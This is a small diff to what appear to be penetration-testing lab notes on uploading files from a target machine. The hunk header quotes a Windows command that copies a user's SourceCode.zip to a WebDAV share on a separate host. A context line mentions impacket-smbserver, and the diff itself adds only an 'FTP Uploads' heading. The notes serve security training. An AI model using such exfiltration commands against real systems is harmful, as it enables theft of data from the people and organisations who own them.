@@ -309,3 +309,6 @@ C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\ C
 
 ##### IMP
 **Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
+
+
+## FTP Uploads
